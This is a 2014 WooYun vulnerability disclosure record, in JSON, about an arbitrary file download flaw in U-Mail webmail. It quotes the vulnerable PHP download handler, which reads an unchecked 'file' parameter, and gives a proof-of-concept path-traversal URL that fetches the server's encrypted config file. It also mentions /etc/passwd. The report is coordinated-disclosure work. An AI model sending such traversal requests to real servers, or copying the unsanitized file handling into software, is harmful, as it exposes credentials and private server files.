{"id": 2242, "wybug_id": "wooyun-2014-060478", "wybug_title": "U-Mail邮件系统任意文件下载漏洞", "wybug_corp": "U-Mail", "wybug_author": "Ano_Tom", "wybug_date": "2014-05-13 01:09", "wybug_open_date": "2014-08-11 01:10", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-11：\t细节向公众公开  简要描述： U-Mail邮件系统某处处理不当，导致任意文件下载漏洞 详细说明：  漏洞文件:C:\\umail\\WorldClient\\html\\client\\mail\\module\\o_mail.php代码：\nif ( ACTION == \"down\" ){        set_time_limit( 0 );        $file = gss( $_GET['file'] );        $is_del = gss( $_GET['delete'] );        if ( !$file )        {                $maildir = get_session( \"maildir\" );                $mb_index = gss( $_GET['mailbox'] ) ? gss( $_GET['mailbox'] ) : 0;                $mb_list = get_session( \"['mb_info']['mailboxlist']\" );                $mb_info = $mb_list[$mb_index];                $sys_folder_list = array( \"inbox\", \"drafts\", \"sent items\", \"deleted items\" );                if ( $mb_info['name'] == \"inbox\" )                {                        pass;                }                else if ( in_array( $mb_info['name'], $sys_folder_list ) )                {                        $maildir .= $mb_info['name'].\".IMAP\".DIRECTORY_SEPARATOR;                }                else                {                        preg_match_all( \"/([\\\\x{4e00}-\\\\x{9fa5}]+)/u\", $mb_info['name'], $zh_match );                        if ( $zh_match )                        {                                $folder_name = $mb_info['name'];                                foreach ( $zh_match[1] as $zh )                                {                                        $conv_name = mb_convert_encoding( $zh, \"UCS-2BE\", \"UTF-8\" );                                        $b64en_str = \"&\".base64_encode( $conv_name ).\"-\";                                        $b64en_str = str_replace( \"=\", \"\", $b64en_str );                                        $folder_name = str_replace( $zh, $b64en_str, $folder_name );                                }                                $maildir .= $folder_name.\".IMAP\".DIRECTORY_SEPARATOR;                        }                        else                        {                                $maildir .= $mb_info['name'].\".IMAP\".DIRECTORY_SEPARATOR;                        }                }                $file = getusercachepath( ).\"mailArchive.zip\";        }        if ( file_exists( $file ) && is_file( $file ) )        {                header( \"Content-type: application/octet-stream\" );                header( \"Content-Disposition: attachment; filename=\".basename( $file ) );                header( \"Cache-Control: must-revalidate, post-check=0, pre-check=0\" );                header( \"Expires: 0\" );                header( \"Pragma: public\" );                header( \"Content-Length: \".filesize( $file ) );                header( \"X-Sendfile: \".$file );                $handle = fopen( $file, \"rb\" );                $buffer = \"\";                while ( !feof( $handle ) )                {                        $buffer = fread( $handle, 4096 );                        echo $buffer;                        ob_flush( );                        flush( );                }                fclose( $handle );        }        else        {                echo \"file not exist or not a file\";                exit( );        }}\n其中$file = gss( $_GET['file'] );//获得文件名 if ( file_exists( $file ) && is_file( $file ) )//如果文件存在且是文件则直接执行下载:(好吧，这样就可以下载任意文件了，注：此处演示的是官网下载的最新版，windows server 2003搭建，且都为默认配置ok，想下载哪些文件随意，未测试linux下的/etc/passwd此处下载网站根目录下的配置文件，默认加密了的，解密即可http://fuckyou.com/webmail/client/mail/index.php?module=operate&action=down&file=./../../mainconfig.php\n\n软件设置的mysql默认端口为6033，应该没开启外连的，未具体测试:(   漏洞证明：  如上详细描述   修复方案：  filter!   版权声明：转载请注明来源 Ano_Tom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-05-16 18:33 厂商回复： CNVD在贵司官网下载的9.8.54版本存在此漏洞，其他实例因无账号无法登陆。由CNVD通过公开渠道联系深圳市福洽科技有限公司处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}